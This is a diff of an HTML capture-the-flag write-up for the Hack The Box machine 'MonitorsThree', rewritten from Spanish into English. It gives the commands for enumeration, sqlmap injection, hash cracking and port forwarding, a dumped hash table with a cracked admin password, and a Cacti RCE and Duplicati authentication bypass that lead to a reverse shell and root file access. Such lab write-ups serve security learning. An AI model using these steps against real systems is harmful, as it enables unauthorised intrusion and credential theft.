@@ -7,6 +7,185 @@
   <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
 </head>
 <body>
-<div class='page'><h1 class='title'>MonitorsThree</h1><br/><p>Realizo un escaneo de puertos</p><p>	<strong>nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN monitors3_scan 10.10.11.30</strong></p><p></p><p>Encontramos el servicio SSH abierto y el servicio HTTP en el puerto 80</p><p>También nos da una dirección</p><p></p><p>	<img src="images/124-1.png" alt="images/124-1.png" /></p><p></p><p>La añadimos a <strong>/etc/hosts</strong></p><p></p><p>Con Wappalyzer podemos ver las tecnologías usadas</p><p></p><p>	<img src="images/124-2.png" alt="images/124-2.png" /></p><p></p><p>Hago una enumeración de directorios y encuentro esto</p><p></p><p>	<img src="images/124-3.png" alt="images/124-3.png" /></p><p></p><p>Admin esta Forbidden</p><p></p><p></p><p>	<img src="images/124-4.png" alt="images/124-4.png" /></p><p></p><p>Con FFUF encuentro un subdominio</p><p>	<strong>ffuf -u </strong><strong><a href="http://monitorsthree.htb/">http://monitorsthree.htb/</a></strong><strong> -H &quot;Host: FUZZ.monitorsthree.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 13560</strong></p><p></p><p>	<img src="images/124-5.png" alt="images/124-5.png" /></p><p></p><p></p><p>En el subdominio cacti encontramos otro login</p><p></p><p>	<img src="images/124-6.png" alt="images/124-6.png" /></p><p></p><p>Este login nos trae una versión 1.2.26</p><p></p><p>Accedemos a la página y de primeras encontramos un login.php</p><p></p><p>	<img src="images/124-7.png" alt="images/124-7.png" /></p><p></p><p>Tambíen hay un forgot password que puede servir</p><p></p><p>	<img src="images/124-8.png" alt="images/124-8.png" /></p><p></p><p>Al meter caracteres al azar me dice que no puede procesar la solicitud</p><p></p><p>	<img src="images/124-9.png" alt="images/124-9.png" /></p><p></p><p>Puede que sea vulnerable a SQLI</p><p>	<strong>sqlmap -r request_pass.txt -p username --dbs</strong></p><p></p><p>Encuentro estas dos dbs</p><p></p><p>	<img src="images/124-10.png" alt="images/124-10.png" /></p><p></p><p>Accedemos a la tabla de users y encontramos hashes</p><p></p><p><code>+-----------+----------------------------------+-----------------------------+</code><code></code></p><p><code>| username  | password                         | email                       |</code><code></code></p><p><code>+-----------+----------------------------------+-----------------------------+</code><code></code></p><p><code>| admin     | 31a181c8372e3afc59dab863430610e8 | admin@monitorsthree.htb     |</code><code></code></p><p><code>| dthompson | 633b683cc128fe244b00f176c8a950f5 | dthompson@monitorsthree.htb |</code><code></code></p><p><code>| janderson | 1e68b6eb86b45f6d92f8f292428f77ac | janderson@monitorsthree.htb |</code><code></code></p><p><code>| mwatson   | c585d01f2eb3e6e1073e92023088a3dd | mwatson@monitorsthree.htb   |</code><code></code></p><p><code>+-----------+----------------------------------+-----------------------------+</code></p><p></p><p>Crakeamos los hashes y nos da una password</p><p></p><p>	<img src="images/124-11.png" alt="images/124-11.png" /></p><p></p><p>	<strong>admin:greencacti2001</strong></p><p></p><p>Con estas creds podemos acceder a <a href="http://monitorsthree.htb/admin/dashboard.php">http://monitorsthree.htb/admin/dashboard.php</a> y <a href="http://cacti.monitorsthree.htb/cacti/index.php">http://cacti.monitorsthree.htb/cacti/index.php</a></p><p></p><p>	<img src="images/124-12.png" alt="images/124-12.png" /></p><p></p><p>	<img src="images/124-13.png" alt="images/124-13.png" /></p><p></p><p>Encotramos 3 usuarios</p><p></p><p>	<img src="images/124-14.png" alt="images/124-14.png" /></p><p></p><p>En <a href="http://monitorsthree.htb/admin/dashboard.php">http://monitorsthree.htb/admin/dashboard.php</a> no encontramos nada interesante</p><p></p><p>Para cacti encontramos un RCE <a href="https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88">https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88</a></p><p></p><p>	<img src="images/124-15.png" alt="images/124-15.png" /></p><p></p><p>Lo ejecutamos con el comando php</p><p></p><p>	<img src="images/124-16.png" alt="images/124-16.png" /></p><p></p><p>Subimos el archivo test.xml.gz</p><p></p><p>	<img src="images/124-17.png" alt="images/124-17.png" /></p><p></p><p>Nos devuelve la reverse shell con el usuario wwwdata</p><p></p><p>	<img src="images/124-18.png" alt="images/124-18.png" /></p><p></p><p>	<img src="images/124-19.png" alt="images/124-19.png" /></p><p></p><p>Encontramos el archivo db.php</p><p></p><p>	<img src="images/124-20.png" alt="images/124-20.png" /></p><p></p><p>	<img src="images/124-21.png" alt="images/124-21.png" /></p><p></p><p></p><p>En db.php encotramos la pass de marcus</p><p>	<strong>$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK</strong></p><p>	<strong>hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --user</strong></p><p></p><p>Accedemos al usuario marcus co su marcus</p><p></p><p>	<img src="images/124-22.png" alt="images/124-22.png" /></p><p></p><p>Con ls -al encotramos la carpeta .ssh</p><p></p><p>	<img src="images/124-23.png" alt="images/124-23.png" /></p><p></p><p></p><p>Para tener una conexión más estable entramos a través de ssh</p><p></p><p>	<img src="images/124-24.png" alt="images/124-24.png" /></p><p></p><p>Subo linpeas.sh con </p><p>	python3 -m http.server 1234</p><p>	wget <a href="http://<YourIP>:1234/linpeas.sh">http://&lt;YourIP&gt;:1234/linpeas.sh</a></p><p></p><p>En puertos activos encuentro algo interensante</p><p>	<img src="images/124-25.png" alt="images/124-25.png" /></p><p></p><p>	<img src="images/124-26.png" alt="images/124-26.png" /></p><p></p><p>Encontramos un login en el puerto 8200 </p><p>	<img src="images/124-27.png" alt="images/124-27.png" /></p><p></p><p>Esto podemos verlo gracias a un portforwarding</p><p>	<strong>ssh -L 8200:127.0.0.1:8200 -i rsa marcus@monitorsthree.htb</strong><strong></strong></p><p><strong></strong></p><p>Encuentro este exploit  <h3>https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee</h3></p><p></p><p>Me descargo el archivo Duplicati-server.sqlite con wget</p><p>	<strong>wget </strong><strong><a href="http://monitorsthree.htb:1234/Duplicati-server.sqlite">http://monitorsthree.htb:1234/Duplicati-server.sqlite</a></strong></p><p></p><p>Lo abro con sqlitebrowser</p><p></p><p>	<img src="images/124-28.png" alt="images/124-28.png" /></p><p></p><p>Encotramos estas credenciales</p><p><strong>	server-passphrase = Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=</strong><strong></strong></p><p><strong>	server-passphrase-salt = xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I= </strong><strong></strong></p><p><strong>	server-passphrase-trayicon = 9664e0c3-82f9-41dc-9c7c-f0299053d1b8 </strong><strong></strong></p><p><strong>	server-passphrase-trayicon-hash = 060ZIdyxlxlS3zF39AeUQzv3XpTdvgrHfv0HdKZYu1I=</strong></p><p>	</p><p>Siguiento los pasos de la documentación encuentro lo que pasa con las variables ¡</p><p></p><p>	<strong>view-source:</strong><strong><a href="http://127.0.0.1:8200/login/login.js?v=2.0.8.1">http://127.0.0.1:8200/login/login.js?v=2.0.8.1</a></strong></p><p>	<img src="images/124-29.png" alt="images/124-29.png" /></p><p>	</p><p><strong>Server-passphrase from DB &gt; From Base64 &gt; then Convert it to Hex ( Usando CyberChef )</strong></p><p>	<strong>59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a</strong></p><p></p><p>Para realizar el cambio en la misma request lo hacemos desde intercept </p><p><img src="images/124-30.png" alt="images/124-30.png" /></p><p></p><p>Accedemos al panel de duplicati</p><p></p><p><img src="images/124-31.png" alt="images/124-31.png" /></p><p></p><p>Creo una backup de la ruta de root</p><p></p><p><img src="images/124-32.png" alt="images/124-32.png" /></p><p></p><p><img src="images/124-33.png" alt="images/124-33.png" /></p><p></p><p>Lo ejecutamos</p><p></p><p><img src="images/124-34.png" alt="images/124-34.png" /></p><p></p><p>Seleccionamos restore files</p><p></p><p><img src="images/124-35.png" alt="images/124-35.png" /></p><p></p><p>Selecionamos el archivo root.txt</p><p></p><p>Y como ruta donde recuperar el archivo selecionamos /home/marcus/</p><p></p><p>Volvemos al sshd de marcus y ya tenemos root.txt</p><p></p><p><img src="images/124-36.png" alt="images/124-36.png" /></p></div>
+<div class="page">
+<h1 class="title">MonitorsThree</h1>
+
+<section>
+<h2>Port Scanning</h2>
+<p>
+The initial step was to perform a full TCP port scan to identify open services and gather banner information:
+</p>
+<pre><code>nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN monitors3_scan 10.10.11.30</code></pre>
+
+<p>
+We found SSH and HTTP (port 80) open, and the scan also revealed the IP address to use.
+</p>
+<img src="images/124-1.png" alt="Scan results" />
+
+<p>
+The IP and hostname were added to <code>/etc/hosts</code> for proper name resolution.
+</p>
+
+<p>
+Using Wappalyzer, the technologies used on the web application were identified.
+</p>
+<img src="images/124-2.png" alt="Wappalyzer technologies" />
+</section>
+
+<section>
+<h2>Directory & Subdomain Enumeration</h2>
+<p>
+Initial directory enumeration revealed an <code>/admin</code> page that returned a Forbidden status.
+</p>
+<img src="images/124-3.png" alt="Directory enumeration" />
+<img src="images/124-4.png" alt="Admin forbidden" />
+
+<p>
+Using <code>ffuf</code>, I enumerated subdomains and discovered <code>cacti.monitorsthree.htb</code>:
+</p>
+<pre><code>ffuf -u http://monitorsthree.htb/ -H "Host: FUZZ.monitorsthree.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 13560</code></pre>
+<img src="images/124-5.png" alt="Subdomain discovery" />
+</section>
+
+<section>
+<h2>Cacti Application</h2>
+<p>
+The subdomain hosts a Cacti installation with a login page and a "Forgot Password" feature. Testing inputs suggested a potential SQL Injection vulnerability:
+</p>
+<img src="images/124-6.png" alt="Cacti login" />
+<img src="images/124-7.png" alt="Login.php page" />
+<img src="images/124-8.png" alt="Forgot password" />
+<img src="images/124-9.png" alt="Error handling hints SQLi" />
+
+<p>
+SQLMap was used to enumerate databases and extract user credentials:
+</p>
+<pre><code>sqlmap -r request_pass.txt -p username --dbs</code></pre>
+<img src="images/124-10.png" alt="Databases discovered" />
+
+<p>
+Inspecting the <code>users</code> table revealed password hashes for several users:
+</p>
+<pre><code>
++-----------+----------------------------------+-----------------------------+
+| username  | password                         | email                       |
++-----------+----------------------------------+-----------------------------+
+| admin     | 31a181c8372e3afc59dab863430610e8 | admin@monitorsthree.htb     |
+| dthompson | 633b683cc128fe244b00f176c8a950f5 | dthompson@monitorsthree.htb |
+| janderson | 1e68b6eb86b45f6d92f8f292428f77ac | janderson@monitorsthree.htb |
+| mwatson   | c585d01f2eb3e6e1073e92023088a3dd | mwatson@monitorsthree.htb   |
++-----------+----------------------------------+-----------------------------+
+</code></pre>
+
+<p>
+After cracking the hashes, we obtained credentials:
+</p>
+<p><strong>admin:greencacti2001</strong></p>
+<img src="images/124-11.png" alt="Cracked hash" />
+
+<p>
+Using these credentials, we could log in to:
+<ul>
+<li><a href="http://monitorsthree.htb/admin/dashboard.php">Admin Dashboard</a></li>
+<li><a href="http://cacti.monitorsthree.htb/cacti/index.php">Cacti Application</a></li>
+</ul>
+</p>
+<img src="images/124-12.png" alt="Admin dashboard" />
+<img src="images/124-13.png" alt="Cacti main page" />
+
+<p>We identified three users in Cacti:</p>
+<img src="images/124-14.png" alt="Cacti users" />
+</section>
+
+<section>
+<h2>Exploitation – RCE in Cacti</h2>
+<p>
+Cacti version 1.2.26 has a known remote code execution vulnerability:
+</p>
+<a href="https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88">Cacti RCE Advisory</a>
+<img src="images/124-15.png" alt="RCE vulnerability" />
+
+<p>
+Using the exploit, a PHP payload was executed by uploading a <code>test.xml.gz</code> file:
+</p>
+<img src="images/124-16.png" alt="PHP command execution" />
+<img src="images/124-17.png" alt="Upload payload" />
+
+<p>
+This gave a reverse shell as <code>www-data</code>:
+</p>
+<img src="images/124-18.png" alt="Reverse shell www-data" />
+<img src="images/124-19.png" alt="Reverse shell active" />
+</section>
+
+<section>
+<h2>Privilege Escalation</h2>
+<p>
+While enumerating the filesystem, the file <code>db.php</code> was discovered, which contained credentials for user <code>marcus</code>:
+</p>
+<img src="images/124-20.png" alt="db.php discovery" />
+<img src="images/124-21.png" alt="db.php contents" />
+
+<p>
+The hash for marcus was cracked using Hashcat:
+</p>
+<pre><code>hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --user</code></pre>
+
+<p>
+SSH access as marcus was then obtained:
+</p>
+<img src="images/124-22.png" alt="SSH access marcus" />
+
+<p>
+Checking <code>.ssh</code> and stabilizing the connection:
+</p>
+<img src="images/124-23.png" alt=".ssh directory" />
+<img src="images/124-24.png" alt="SSH stable session" />
+
+<p>
+LinPEAS was uploaded for privilege enumeration using a simple Python HTTP server:
+</p>
+<p>
+<code>python3 -m http.server 1234</code> and <code>wget http://&lt;YourIP&gt;:1234/linpeas.sh</code>
+</p>
+
+<p>
+Port enumeration revealed an internal service on port 8200. Using SSH port forwarding, it was accessed locally:
+</p>
+<pre><code>ssh -L 8200:127.0.0.1:8200 -i rsa marcus@monitorsthree.htb</code></pre>
+<img src="images/124-27.png" alt="Port 8200 login" />
+
+<p>
+Following the documented Duplicati exploit, the <code>Duplicati-server.sqlite</code> database was downloaded and analyzed to recover the server passphrase:
+</p>
+<img src="images/124-28.png" alt="Duplicati sqlite database" />
+<p>
+Passphrase after decoding & converting to hex:
+</p>
+<p><strong>59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a</strong></p>
+<img src="images/124-29.png" alt="Passphrase extraction" />
+<img src="images/124-30.png" alt="Intercept request modification" />
+
+<p>
+With the correct passphrase, access to the Duplicati panel was obtained:
+</p>
+<img src="images/124-31.png" alt="Duplicati panel" />
+
+<p>
+A backup job was created to restore the <code>root.txt</code> file to <code>/home/marcus/</code>:
+</p>
+<img src="images/124-32.png" alt="Backup configuration" />
+<img src="images/124-33.png" alt="Backup selection" />
+<img src="images/124-34.png" alt="Backup execute" />
+<img src="images/124-35.png" alt="Restore files" />
+
+<p>
+Finally, the <code>root.txt</code> file was recovered via marcus's SSH session:
+</p>
+<img src="images/124-36.png" alt="root.txt recovered" />
+</section>
+
+</div>
 </body>
+
 </html>
